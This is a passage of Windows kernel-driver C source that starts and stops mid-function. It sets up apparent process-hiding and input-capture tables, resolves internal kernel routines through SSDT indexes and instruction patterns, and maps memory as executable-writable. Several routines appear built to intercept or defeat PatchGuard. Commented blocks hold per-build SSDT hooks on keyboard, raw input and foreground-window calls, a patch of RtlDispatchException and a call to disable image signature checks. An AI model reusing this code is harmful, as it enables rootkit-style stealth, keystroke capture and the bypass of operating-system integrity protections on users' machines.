	//if (TimeS > (13382530421 + 2592000*2))
	//{
	//	if ((TimeS - (13382530421 + 2592000*2)) > 2592000)
	//	{
	//		LOG_DEBUG("TimeS must rebuild\n");
	//		return;
	//	}
	//}
//#endif // DEBUG



	

	//STATUS_ABANDON_HIBERFILE

	//InitializeListHead

	//RemoveEntryList
	//LIST_ENTRY


	FlshWin32kShow();

	

	//start_hook();

	//----------------
	RtlInitializeAvl(&TableAvl_HideProcess);
	RtlInitializeAvl(&TableAvl_Mouse);
	RtlInitializeAvl(&TableAvl_Hwnd);
	RtlInitializeAvl(&TableAvl_Data_Input);
	RtlInitializeAvl(&TableAvl_KeyBoard);



	RtlInitializeAvlString(&TableAvl_UNICODE_PROCESS);
	RtlInitializeAvlString(&TableAvl_UNICODE_STRING);

	RtlInitializeAvlString(&TableAvl_UNICODE_METUX);
	RtlInitializeAvlString(&TableAvl_UNICODE_EVENT);
	RtlInitializeAvlString(&TableAvl_UNICODE_SECTION);





	KeInitializeSpinLock(&SpinUserProcessLock);
	InitializeListHead(&BgeinMemList.Link);

	

	//DisableFromSeValidateImage();


	//_RtlDispatchExceptionJmp = uRtlDispatchException + 0xC;
	//char NoJmp[15] = { 0xE9,0,0,0,0,0,0,0,0,0 };
	//char pAdrV = NoJmp;
	//LONGLONG  offsetV = (LONGLONG)&V_RtlDispatchException - (LONGLONG)(uRtlDispatchException + 5);
	//if (offsetV > -0x7FFFFFFF && offsetV < 0x80000000){
	//	LONG offsetNow = offsetV;
	//	*((LONG*)(&NoJmp[1])) = offsetNow;
	//	writeSafeMemory(uRtlDispatchException, NoJmp, 5);
	//	LOG_DEBUG(" HOOK  RtlDispatchException<%08X>", offsetNow);
	//}





//#ifndef RELOAD_IMAGE
	
//#endif

	//InitializeMemory();




	//TIMER_DPC_INFO_0* pDpcInfo = ExAllocatePoolWithTag(PagedPool, sizeof(TIMER_DPC_INFO_0), 'Tag');

	//KeInitializeTimer(&pDpcInfo->Timer);

	//pDpcInfo->DeferredRoutine = PollingDpcTimer;
	////pDpcInfo->sockfd = server_socket;
	//KeInitializeDpc(&pDpcInfo->Dpc, PollingDpcTimer, pDpcInfo);

	//LARGE_INTEGER DueTime; DueTime.QuadPart = 0;

	//KeSetTimer(&pDpcInfo->Timer, DueTime, &pDpcInfo->Dpc);


	


	//return;
	//ULONG64 PspCidTable = 0;
	//get_PspCidTable(&PspCidTable);
	//LOG_DEBUG(" PspCidTable :<%p>\n", PspCidTable);
	int Number_NtUserGetThreadState = -1;
	int Number_NtUserCallTwoParam = -1;
	int Number_NtUserGetForegroundWindow = -1;
	int Number_NtUserGetKeyboardState = -1;
	int Number_NtUserGetRawInputData = -1;
	//SSDT
	int Number_NtCreateMutant = -1;
	int Number_NtOpenMutant = -1;

	if (TrueNtQueryInformationProcess == 0) {
		UNICODE_STRING fName = RTL_CONSTANT_STRING(L"ZwQueryInformationProcess");
		TrueNtQueryInformationProcess = GetProcAddress_Kernel(kernelBase, "ZwQueryInformationProcess");  // MmGetSystemRoutineAddress(&fName);
		LOG_DEBUG("NtQueryInformationProcess <%p>\n", TrueNtQueryInformationProcess);
	}

	//if (uMiFreeUltraMapping != 0)
	//{
	//	LOG_DEBUG("HOOK MiFreeUltraMapping<%p>\n", uMiFreeUltraMapping);
	//	SSDT_HOOK_NOW(&wMiFreeUltraMapping, uMiFreeUltraMapping, &TrueMiFreeUltraMapping);
	//}
	// 38 0D ? ? ? ? 75 02 EB FE

	UNICODE_STRING FuncName7 = { 0 };
	RtlInitUnicodeString(&FuncName7, L"NtCreateFile");
	ULONGLONG  pNtCreateFile = GetProcAddress_Kernel(kernelBase, "NtCreateFile");
	if (pNtCreateFile == 0)
	{
		LOG_DEBUG(" can't find NtCreateFile\n");
	}

	if (pNtCreateFile != 0)
	{
		uIopCreateFile = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pNtCreateFile, 1));
		LOG_DEBUG("FUNCTION : IopCreateFile <%p>\n", uIopCreateFile);
	}

	ULONGLONG pNtCreateMutantW = 0;
	ULONGLONG pNtOpenMutantW = 0;
	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		pNtCreateMutantW = GetSSDTFuncAddr(154);
		pNtOpenMutantW = GetSSDTFuncAddr(246);
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {
		pNtCreateMutantW = GetSSDTFuncAddr(174);
		pNtOpenMutantW = GetSSDTFuncAddr(286);
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		pNtCreateMutantW = GetSSDTFuncAddr(175);
		pNtOpenMutantW = GetSSDTFuncAddr(287);
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		pNtCreateMutantW = GetSSDTFuncAddr(179);
		pNtOpenMutantW = GetSSDTFuncAddr(292);
	}
	if (pNtCreateMutantW != 0) {
		ExMutantObjectType = (POBJECT_TYPE *)_CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RBX((char *)pNtCreateMutantW, 1), 3);
		uObCreateObject = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pNtCreateMutantW, 1));
		LOG_DEBUG("ExMutantObjectType<%p>\n", ExMutantObjectType);
		LOG_DEBUG("uObCreateObjectEx<%p>\n", uObCreateObject);
	}
	if (pNtOpenMutantW != 0)
	{
		uObOpenObjectByName = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pNtOpenMutantW, 1));

		LOG_DEBUG("uObOpenObjectByName<%p>\n", uObOpenObjectByName);
	}

	//ULONGLONG  pNtTerminateProcess = ZwFuncGetNtFun(L"ZwTerminateProcess");
	//if (pNtTerminateProcess != 0) {
	//	uPspTerminateProcess = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)pNtTerminateProcess, 2));
	//	LOG_DEBUG("uPspTerminateProcess<%p>\n", uPspTerminateProcess);
	//}



	//PoSetHiberRange


	//IniFilterFile();


	//	_KPRCB
		//IniSandBox();
		//IniLoadSys_HIDE();
	return;
}

//if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
//{
//	SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	SSDT_SHOW_HOOK(42, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//
//	TwoType = 0x69;
//
//	SSDT_SHOW_HOOK(60, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	SSDT_SHOW_HOOK(120, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	//SSDT_SHOW_HOOK(701, &Br_NtUserGetRawInputBuffer, &TrueNtUserGetRawInputBuffer);
//	SSDT_SHOW_HOOK(702, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//
//	//SSDT_HOOK(154, &NtCreateMutant, &TrueNtCreateMutant);
//	//SSDT_HOOK(246, &NtOpenMutant, &TrueNtOpenMutant);
//
//
//	//SSDTSHOW
//	//Number_NtUserGetThreadState = 0;
//	//Number_NtUserCallTwoParam = 42;
//	//Number_NtUserGetForegroundWindow = 60;
//	//Number_NtUserGetKeyboardState = 120;
//	//Number_NtUserGetRawInputData = 702;
//
//	//SSDT
//	//Number_NtCreateMutant = 154;
//	//Number_NtOpenMutant = 246;
//
//	//SSDT_HOOK(69, (PVOID)&Br_NtCreateEvent, (PVOID)&TrueNtCreateEvent);
//	//SSDT_HOOK(61, (PVOID)&Br_NtOpenEvent, (PVOID)&TrueNtOpenEvent);
//
//	//SSDT_HOOK(71, (PVOID)&Br_NtCreateSection, (PVOID)&TrueNtCreateSection);
//	//SSDT_HOOK(52, (PVOID)&Br_NtOpenSection, (PVOID)&TrueNtOpenSection);
//
//}
//else if (OsVersion.dwBuildNumber < 17763 /*>=10240 && OsVersion.dwBuildNumber < 16299*/) {
//
//	//SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	//SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//	//TwoType = 0x82;
//
//	//SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	//SSDT_SHOW_HOOK(122, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	////	SSDT_SHOW_HOOK(1018, &Br_NtUserGetRawInputBuffer, &TrueNtUserGetRawInputBuffer);
//	//SSDT_SHOW_HOOK(943, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//	//// 1156 NtUserSetCursorPos
//	//SSDT_HOOK(167, &NtCreateMutant, &TrueNtCreateMutant);
//	//SSDT_HOOK(272, &NtOpenMutant, &TrueNtOpenMutant);
//
//	//SSDT_HOOK(72, &Br_NtCreateEvent, &TrueNtCreateEvent);
//	//SSDT_HOOK(64, &Br_NtOpenEvent, &TrueNtOpenEvent);
//
//	//SSDT_HOOK(74, &Br_NtCreateSection, &TrueNtCreateSection);
//	//SSDT_HOOK(55, &Br_NtOpenSection, &TrueNtOpenSection);
//}
//else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {
//
//	SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//	TwoType = 0x82;
//
//	SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	SSDT_SHOW_HOOK(121, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	//	SSDT_SHOW_HOOK(1018, &Br_NtUserGetRawInputBuffer, &TrueNtUserGetRawInputBuffer);
//	SSDT_SHOW_HOOK(1019, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//	// 1156 NtUserSetCursorPos
//
//	//SSDT_HOOK(174, &NtCreateMutant, &TrueNtCreateMutant);
//	//SSDT_HOOK(286, &NtOpenMutant, &TrueNtOpenMutant);
//
//	//SSDT_HOOK(72, &Br_NtCreateEvent, &TrueNtCreateEvent);
//	//SSDT_HOOK(64, &Br_NtOpenEvent, &TrueNtOpenEvent);
//
//	//SSDT_HOOK(74, &Br_NtCreateSection, &TrueNtCreateSection);
//	//SSDT_HOOK(55, &Br_NtOpenSection, &TrueNtOpenSection);
//
//
//}
//else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
//
//	SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//
//
//	SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//	TwoType = 0x81;
//	SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	//SSDT_SHOW_HOOK(121, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	SSDT_SHOW_HOOK(1029, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//
//	//SSDT_HOOK(175, &NtCreateMutant, &TrueNtCreateMutant);
//	//SSDT_HOOK(287, &NtOpenMutant, &TrueNtOpenMutant);
//	//SSDT_HOOK(72, &Br_NtCreateEvent, &TrueNtCreateEvent);
//	//SSDT_HOOK(64, &Br_NtOpenEvent, &TrueNtOpenEvent);
//	//SSDT_HOOK(74, &Br_NtCreateSection, &TrueNtCreateSection);
//	//SSDT_HOOK(55, &Br_NtOpenSection, &TrueNtOpenSection);
//
//	// 1170 NtUserSetCursorPos
//}
//else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
//
//	SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	SSDT_SHOW_HOOK(42, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//	TwoType = 0x7F;
//	SSDT_SHOW_HOOK(60, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	SSDT_SHOW_HOOK(118, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	SSDT_SHOW_HOOK(1077, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//
//	//SSDT_HOOK(179, &NtCreateMutant, &TrueNtCreateMutant);
//	//SSDT_HOOK(292, &NtOpenMutant, &TrueNtOpenMutant);
//	//SSDT_HOOK(72, &Br_NtCreateEvent, &TrueNtCreateEvent);
//	//SSDT_HOOK(64, &Br_NtOpenEvent, &TrueNtOpenEvent);
//	//SSDT_HOOK(74, &Br_NtCreateSection, &TrueNtCreateSection);
//	//SSDT_HOOK(55, &Br_NtOpenSection, &TrueNtOpenSection);
//
//}
//else if (OsVersion.dwBuildNumber >= 20384)
//{
//
//	SSDT_SHOW_HOOK(0, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	//WIN11 没这玩意
//	//SSDT_SHOW_HOOK(42, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//	//TwoType = 0x7F;
//	SSDT_SHOW_HOOK(55, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	SSDT_SHOW_HOOK(113, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	SSDT_SHOW_HOOK(1118, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//
//	return;
//	//SSDT_SHOW_HOOK(3, &Br_NtUserGetThreadState, &TrueNtUserGetThreadState);
//	//SSDT_SHOW_HOOK(45, &Br_NtUserCallTwoParam, &TrueNtUserCallTwoParam);
//
//	//TwoType = 0x82;
//	//SSDT_SHOW_HOOK(63, &Br_NtUserGetForegroundWindow, &TrueNtUserGetForegroundWindow);
//	//SSDT_SHOW_HOOK(121, &Br_NtUserGetKeyboardState, &TrueNtUserGetKeyboardState);
//	//	SSDT_SHOW_HOOK(1018, &Br_NtUserGetRawInputBuffer, &TrueNtUserGetRawInputBuffer);
//	//SSDT_SHOW_HOOK(1019, &Br_NtUserGetRawInputData, &TrueNtUserGetRawInputData);
//}










#include <ntimage.h>



//#include <ntamd64.h>







#define UNWIND_HISTORY_TABLE_SIZE 12

typedef struct _UNWIND_HISTORY_TABLE_ENTRY {
	ULONG64 ImageBase;
	PRUNTIME_FUNCTION FunctionEntry;
} UNWIND_HISTORY_TABLE_ENTRY, * PUNWIND_HISTORY_TABLE_ENTRY;

#define UNWIND_HISTORY_TABLE_NONE 0
#define UNWIND_HISTORY_TABLE_GLOBAL 1
#define UNWIND_HISTORY_TABLE_LOCAL 2

typedef struct _UNWIND_HISTORY_TABLE {
	ULONG Count;
	UCHAR Search;
	ULONG64 LowAddress;
	ULONG64 HighAddress;
	UNWIND_HISTORY_TABLE_ENTRY Entry[UNWIND_HISTORY_TABLE_SIZE];
} UNWIND_HISTORY_TABLE, * PUNWIND_HISTORY_TABLE;

NTSYSAPI
PRUNTIME_FUNCTION
RtlLookupFunctionEntry(
	IN ULONG64 ControlPc,
	OUT PULONG64 ImageBase,
	IN OUT PUNWIND_HISTORY_TABLE HistoryTable OPTIONAL
);




PVOID MmGetSystemRoutineAddressEx(SIZE_T uModBase, CHAR* cSearchFnName)
{
	IMAGE_DOS_HEADER* doshdr;
#ifdef AMD64
	IMAGE_OPTIONAL_HEADER64* opthdr;
#else
	IMAGE_OPTIONAL_HEADER32* opthdr;
#endif
	IMAGE_EXPORT_DIRECTORY* pExportTable;
	ULONG* dwAddrFns, * dwAddrNames;
	USHORT* dwAddrNameOrdinals;
	ULONG dwFnOrdinal, i;
	SIZE_T uFnAddr = 0;
	char* cFunName;
	doshdr = (IMAGE_DOS_HEADER*)uModBase;
	if (NULL == doshdr)
	{
		goto __exit;
	}
#ifdef AMD64
	opthdr = (IMAGE_OPTIONAL_HEADER64*)(uModBase + doshdr->e_lfanew + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER));
#else
	opthdr = (IMAGE_OPTIONAL_HEADER32*)(uModBase + doshdr->e_lfanew + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER));
#endif
	if (NULL == opthdr)
	{
		goto __exit;
	}
	pExportTable = (IMAGE_EXPORT_DIRECTORY*)(uModBase + opthdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (NULL == pExportTable)
	{
		goto __exit;
	}
	dwAddrFns = (ULONG*)(uModBase + pExportTable->AddressOfFunctions);
	dwAddrNames = (ULONG*)(uModBase + pExportTable->AddressOfNames);
	dwAddrNameOrdinals = (USHORT*)(uModBase + pExportTable->AddressOfNameOrdinals);
	for (i = 0; i < pExportTable->NumberOfNames; ++i)
	{
		cFunName = (char*)(uModBase + dwAddrNames[i]);
		if (!_strnicmp(cSearchFnName, cFunName, strlen(cSearchFnName)))
		{
			dwFnOrdinal = pExportTable->Base + dwAddrNameOrdinals[i] - 1;
			uFnAddr = uModBase + dwAddrFns[dwFnOrdinal];
			break;
		}
	}
__exit:
	return (PVOID)uFnAddr;
}


#include <wdm.h>
typedef __int64(__fastcall* fMiProcessDeleteOnClose)(__int64 a1);
fMiProcessDeleteOnClose wMiProcessDeleteOnClose = 0;


fMiProcessDeleteOnClose get_MiProcessDeleteOnClose() {
	return wMiProcessDeleteOnClose;
}











ULONGLONG HalpTimerWatchdogPreResetInterruptPtr = 0;

extern DWORD64 KernelBaseSize;



DWORD PathGuardNumber = 0;



void Kenerl_WriteFile(wchar_t * FileUnicodeStr, UNICODE_STRING  *Log) {


	OBJECT_ATTRIBUTES  objectAttri;
	IO_STATUS_BLOCK iostatus;
	HANDLE hfile;
	UNICODE_STRING logFileUnicodeStr;

	// 初始化 UNICODE_STRING 字符串
	//RtlInitUnicodeString(&logFileUnicodeStr, L"\\?\\C:\\1.LOG");
	// 或者写成 “\\Device\\HarddiskVolume1\\1.LOG”

	// 初始化 objectAttri
	//logFileUnicodeStr

	//UNICODE_STRING LogFile;
	RtlInitUnicodeString(&logFileUnicodeStr, FileUnicodeStr);


	InitializeObjectAttributes(&objectAttri,
		&logFileUnicodeStr,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL
	);




	KIRQL irql = KeGetCurrentIrql();

	__writecr8(PASSIVE_LEVEL);
	
	LOG_DEBUG("NtCreateFile\n");
	// 创建文件
	NTSTATUS ntStatus = NtCreateFile(&hfile,
		GENERIC_WRITE,
		&objectAttri,
		&iostatus,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN_IF, // 即使存在该文件，也创建
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0
	);
	LOG_DEBUG("NtCreateFile End\n");
	if (!NT_SUCCESS(ntStatus))
	{
		__writecr8(irql);
		LOG_DEBUG("The file is not exist  %08X\n", ntStatus);
		return;
	}
	LOG_DEBUG("NtWriteFile\n");
	ntStatus = NtWriteFile(hfile, NULL,
		NULL, NULL,
		&iostatus,
		Log->Buffer,
		(LONG)Log->Length,
		NULL, NULL);
	LOG_DEBUG("NtWriteFile End\n");
	if (!NT_SUCCESS(ntStatus))
	{
		LOG_DEBUG("The file is not exist  %08X\n", ntStatus);
	}
	ZwClose(hfile);
	__writecr8(irql);
	LOG_DEBUG("The program really read %d bytes\n", Log->Length);
}



DWORD  DebugNumber = 0;


//uint32_t ror(uint32_t value, uint32_t bits) {
//	return (value >> bits) | (value << (32 - bits));
//}
//
//uint32_t r8(uint32_t value, uint32_t bits) {
//	return (value >> bits) | (value << (64 - bits));
//}



BOOLEAN NTAPI HandleGuardDispatch(ULONGLONG RCX, ULONGLONG RDX, ULONGLONG r8, ULONGLONG R9, ULONGLONG gFun, ULONGLONG CallR) {







	DWORD v1 = *((DWORD*)gFun);
	DWORD v2 = *((DWORD*)(gFun + 4));
	DWORD v3 = *((DWORD*)(gFun + 8));



	BOOLEAN bDebug = FALSE;

	if (v1 == 0x1131482E) {
		bDebug = TRUE;
		LOG_DEBUG("0 pFun<%p>  Flahs<%p> CallR<%p>\n", RCX, RDX, CallR - (DWORD64)kernelBase);
		//wchar_t Buffer[1024] = { 0 };
		//LOG_DEBUG("1 <%p><%p><%p><%p><%p>\n", RCX, RDX, r8, R9, CallR);


		//LOG_DEBUG("0 pFun<%p>  Flahs<%p> CallR<%p>\n", RCX, RDX, CallR - (DWORD64)kernelBase);

		//RtlStringCbPrintfW(Buffer, sizeof(Buffer), L"1 <%I64X><ker + %08X><%I64X><%I64X><%I64X>", RCX, RDX - (DWORD64)kernelBase, r8, R9, gFun);

#ifdef DEBUG
		//DWORD MaxIndex = *(DWORD*)(RCX + 0xC4);//*((unsigned int*)RCX + 49);

		//LOG_DEBUG("0 pFun<%I64X>  Flahs<%I64X> CallR<%I64X> Index %I64X\n", 
  //        RCX, RDX, CallR - (DWORD64)kernelBase, *(DWORD64*)gFun);

		MMPTE* pMpte = GetAddressPfn(gFun);

		LOG_DEBUG("1 pFun<%p>  Flahs<%p>  <Flags:%d> <%d>\n", gFun,*(DWORD64*)gFun,
			pMpte->u.Hard.SoftwareWsIndex, pMpte->u.Hard.reserved1);



#endif // DEBUG




		DebugNumber++;
		//return TRUE;
	}
	else if (v1 == 0x48513148 && 
		v2 == 0x50513148) {
		bDebug = TRUE;
		LOG_DEBUG("1 pFun<%p>  Flahs<%p> CallR<%p>\n", RCX, RDX, CallR - (DWORD64)kernelBase);


#ifdef DEBUG
		//wchar_t Buffer[1024] = { 0 };
		DWORD64 pFlags = *((DWORD64*)(gFun + 0xA7));;

		DWORD64 pA = RCX + 72;
		DWORD64 pFun = (DWORD64*)(*(DWORD64*)(*(DWORD64*)(RCX + 64) + 32i64) ^ *(DWORD64*)(*(DWORD64*)(RCX + 64) + 64i64) | 0xFFFF800000000000ui64);
		DWORD64 v4 = *(DWORD64*)pFun ^ pFlags; // 0x85131481131482Ei64;

		DWORD64 gFlags = *(DWORD64*)pFun ^ v4;

		DWORD64 nFlags = 0x85131481131482E ^ v4;


		MMPTE * pMpte = GetAddressPfn(pFun);

		LOG_DEBUG("1 pFun<%p>  Flahs<%p>  FUNHEAD<%I64X>  <%I64X> <%I64X>   <Flags:%d> <%d>\n", pFun, v4, *(DWORD64*)pFun, gFlags, nFlags, 
			pMpte->u.Hard.SoftwareWsIndex, pMpte->u.Hard.reserved1);
		if (gFlags == 0x85131481131482E)
		{
			//return TRUE;
		}
		return FALSE;
#endif // DEBUG






		// 49084128 5bd0f64f
		//RtlStringCbPrintfW(Buffer, 1024 * 2, L"2 <%p><ker +%p><%p><%p><%p>", RCX, RDX - (DWORD64)kernelBase, r8, R9, gFun);
		//LOG_DEBUG("2 <%ws>\n", Buffer);

		DebugNumber++;
		//return TRUE;
	}
	else if (v1 == KiTimerDispatch[0] &&
		v2 == KiTimerDispatch[1] &&
		v3 == KiTimerDispatch[2]) {
		bDebug = TRUE;
		LOG_DEBUG("2 pFun<%p>  Flahs<%p> CallR<%p>\n", RCX, RDX, CallR - (DWORD64)kernelBase);

#ifdef DEBUG
		DWORD64  offset = RDX ^ *(DWORD64*)(RCX + 64);
		DWORD64 pFun = offset | 0xFFFF800000000000ui64;


		DWORD64 v4 = *(DWORD64*)pFun ^ 0x85131481131482E;
		//0x85131481131482E
		DWORD64 gFlags = *(DWORD64*)pFun ^ v4;

		DWORD64 nFlags = 0x85131481131482E ^ v4;

		MMPTE* pMpte = GetAddressPfn(pFun);

		LOG_DEBUG("2 pFun<%p>  Flahs<%p>  FUNHEAD<%I64X>  <%I64X> <%I64X>   <Flags:%d> <%d>\n", pFun, v4, *(DWORD64*)pFun, gFlags, nFlags,
			pMpte->u.Hard.SoftwareWsIndex, pMpte->u.Hard.reserved1);


		//LOG_DEBUG("1 pFun<%p>  Flahs<%p>\n", pFun, v4);
		//LOG_DEBUG("2 pFun<%p>  Flahs<%p>  FUNHEAD<%I64X>\n", pFun, v4, *(DWORD64*)pFun);

		if (gFlags == 0x85131481131482E)
		{
			//return TRUE;
		}
		return FALSE;
#endif // DEBUG

		//if (gFlags == 0x85131481131482E)
		//{
		//	return TRUE;
		//}
		//return FALSE;
		//wchar_t Buffer[1024] = { 0 };
		//RtlStringCbPrintfW(Buffer, 1024 * 2, L"3 <%p><ker +%p><%p><%p><%p>", RCX, RDX - (DWORD64)kernelBase, r8, R9, gFun);

		//LOG_DEBUG("3 <%ws>\n", Buffer);
		DebugNumber++;
		//LOG_DEBUG("3 <%p><%p><%p><%p><%p>\n", RCX, RDX, r8, R9, CallR);
		//return TRUE;
	}

	if (bDebug)
	{
		//CmpLazyFlushDpcRoutine

		//_bittest()

		//LOG_DEBUG("0 pFun<%p>  Flahs<%p> CallR<%p>\n", RCX, RDX, CallR - (DWORD64)kernelBase);
		LOG_DEBUG_I64X(pEtwpHostSiloState);
		LOG_DEBUG_I64X(gFun >> 16);

		LOG_DEBUG_I64X(((DWORD64)_retpoline_image_bitmap) + 8 * ((gFun >> 16) / 0x20));
		

		//if (_bittest64(_retpoline_image_bitmap, gFun >> 16))
		//	LOG_DEBUG_I64X(gFun >> 16)
		//_bittestandset64()


		//DWORD v9 = *(DWORD*)(pEtwpHostSiloState + 0x1080);

		//LOG_DEBUG_I64X(v9);

		//ULONG pIndex = 0;
		//_BitScanForward(&pIndex, v9);
		//INT8 pA3 = *((INT8*)(pEtwpHostSiloState + 0x1070 + 2 * pIndex));
		//LOG_DEBUG_I64X(pA3);
		//LOG_DEBUG_I64X(pIndex);
		//LOG_DEBUG_I64X(pEtwpHostSiloState);


		//DWORD64 v12 = 0x20i64 * (unsigned int)pIndex + pEtwpHostSiloState + 0x10A4;

		//UINT64 v6 = 0xA0000002;




		//*((DWORD*)(v12 + 4 * (v6 >> 29))) = 2;

		//DWORD Line = ((unsigned int)v6 & *(DWORD*)(v12 + 4 * (v6 >> 29)) & 0x1FFFFFFF);

		////0xA0000002

		//LOG_DEBUG_I64X(v12);

		//LOG_DEBUG_I64X(Line & 0xFFFFFFFF);


		//DWORD64 v13 = *(DWORD64*)(pEtwpHostSiloState + 0x1C8);
		////v14 = *(PVOID**)(8 * pA3 + v13);
		//LOG_DEBUG_I64X(v13);


		//LOG_DEBUG_I64X(8 * pA3 + v13);

		//PVOID CkclWmiLoggerContext = *(PVOID**)(8 * pA3 + v13);//pEtwpDebuggerDataSilo[0x2];

		//LOG_DEBUG_I64X(CkclWmiLoggerContext);

		//ULONG64* pGetCpuClock = (void**)((unsigned long long)CkclWmiLoggerContext + 0x28);

		//LOG_DEBUG_I64X(pGetCpuClock);

		//LOG_DEBUG_I64X(*pGetCpuClock);



		//DWORD* ICALL_MASK = (DWORD*)((DWORD64)PerfGlobalGroupMask + 0x14);

		//LOG_DEBUG("Mask :%08X\n", *ICALL_MASK);

		//UCHAR uFlags = __readgsbyte(0x853);
		//LOG_DEBUG("uFlags :%08X\n", uFlags);
		////__writegsbyte(0x853, uFlags | 2);


		//LARGE_INTEGER Large;
		////bLogGetCpu = TRUE;
		////hThreadID = PsGetCurrentThreadId();
		//indirect_rax(mGetCpuClockV, &Large);


	}


	return FALSE;
}

PVOID LoadMoudleMemW(PVOID Buffer, size_t nSize, PMDL* pMdl) {

	PVOID KernelBuffer = 0;
	NTSTATUS status = STATUS_SUCCESS;
	*pMdl = IoAllocateMdl(Buffer, nSize, 0, 0, NULL);
	if (*pMdl == 0)
	{
		return 0;
	}
	__try
	{
		MmBuildMdlForNonPagedPool(*pMdl);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		IoFreeMdl(*pMdl);
		return 0;
	}

	__try {
		KernelBuffer = MmMapLockedPagesSpecifyCache(*pMdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(*pMdl);
		return 0;
	}
	status = MmProtectMdlSystemAddress(*pMdl, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		IoFreeMdl(*pMdl);
		return 0;
	}
	return KernelBuffer;
}


DWORD64 PreKey1 = 0x4808588948c48b48ull;
DWORD64 PreKey2 = 0x5518788948107089ull;
DWORD64 Key1 = 0;
DWORD64 Key2 = 0;
ULONG_PTR g_ExQueueWorkItem = 0;
PVOID g_FreePg = 0;
ULONG_PTR ScanMinSize = 0;
void get_key()
{
	//PVOID lpNtMem = nullptr;
	//auto st = ddk::util::LoadFileToMem(L"\\SystemRoot\\System32\\ntoskrnl.exe", &lpNtMem);
	//if (!NT_SUCCESS(st))
	//{
	//	LOG_DEBUG("OpenFile Failed\r\n");
	//	return;
	//}
	//if (!lpNtMem)
	//{
	//	LOG_DEBUG("Load File Failed\r\n");
	//	return;
	//}
	//auto exit1 = std::experimental::make_scope_exit([&]() {
	//	if (lpNtMem)
	//	{
	//		ExFreePool(lpNtMem);
	//	}
	//});
	//找到节表INITKDBG




	const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(kernelBase);
	const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(kernelBase)+dos_header->
		e_lfanew);
	const USHORT NumSections = pNtHeader->FileHeader.NumberOfSections;
	const PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
		IMAGE_NT_HEADERS));

	UCHAR* pScan = 0;
	DWORD ScanSize = 0;
	for (auto i = 0; i < NumSections; i++)
	{
		if (memcmp(pSections[i].Name, "INITKDBG", 8) == 0)
		{
			pScan = (PUCHAR)kernelBase + pSections[i].VirtualAddress;
			ScanSize = max(pSections[i].SizeOfRawData, \
				pSections[i].Misc.VirtualSize);
			ScanMinSize = pSections[i].SizeOfRawData;
			break;
		}
	}
	if (!pScan)
	{
